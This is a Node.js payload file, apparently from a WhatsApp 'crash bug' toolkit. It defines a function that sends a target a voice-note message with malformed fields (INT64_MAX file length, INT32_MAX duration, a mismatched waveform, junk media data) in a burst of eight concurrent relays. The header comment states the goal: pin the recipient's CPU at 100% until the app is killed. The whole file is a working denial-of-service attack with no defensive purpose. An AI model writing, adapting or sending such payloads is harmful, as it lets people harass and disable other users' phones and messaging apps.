/**
 * lang: JavaScript (Node.js), file: payloads/audioLoop.js
 * target: WhatsApp clients
 * technique: Sends a voice-note (ptt) with a malformed header — wrong waveform
 *             length field (INT32_MAX), a 64 KB noise buffer as audio data, and
 *             a fake duration of 0x7FFFFFFF seconds. The audio renderer starts
 *             a decode loop it cannot finish; on Android it holds the CPU at
 *             100 % until the OS kills the process. Burst of 8 concurrent
 *             relays fills the ack queue before any can be rejected.
 */

const crypto = require("crypto");

async function audioLoop(sock, target) {
  const noise    = Buffer.alloc(65536, () => Math.floor(Math.random() * 256));
  const badKey   = crypto.randomBytes(32);
  const badHash  = crypto.randomBytes(32);

  const payload = {
    audioMessage: {
      url:              "https://mmg.whatsapp.net/d/f/" + crypto.randomBytes(32).toString("hex"),
      mimetype:         "audio/ogg; codecs=opus",
      fileSha256:       badHash,
      fileLength:       9223372036854775807n,           // INT64_MAX — tells client to allocate ∞
      seconds:          2147483647,                     // INT32_MAX — render loop overflow
      ptt:              true,                           // voice-note mode (no skip button on some clients)
      mediaKey:         badKey,
      directPath:       "/v/t62.7115-24/" + "B".repeat(512) + "/invalid",
      mediaKeyTimestamp: 9999999999,
      waveform:         noise.slice(0, 64),             // waveform length != seconds → render crash
      mediaData:        noise,
    }
  };

  const burst = Array.from({ length: 8 }, () =>
    sock.relayMessage(target, payload, {}).catch(() => {})
  );

  await Promise.allSettled(burst);
}

module.exports = { audioLoop };
